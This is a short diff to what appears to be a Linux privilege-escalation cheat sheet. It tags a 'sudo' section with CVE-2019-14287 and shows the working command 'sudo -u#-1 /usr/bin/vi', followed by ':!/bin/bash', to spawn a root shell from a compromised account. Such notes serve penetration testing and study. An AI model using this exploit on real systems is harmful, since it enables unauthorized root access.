@@ -193,7 +193,7 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 
 <li>https://gtfobins.github.io/</li>
 
-<h2>sudo</h2>
+<h2>sudo</h2> <b>CVE-2019-14287</b>
 
 <b>hacked-account@victim:~: </b><code>sudo -u#-1 /usr/bin/vi /home/hacked-account/user.txt</code> followed by shift+: <code>!/bin/bash</code>
 
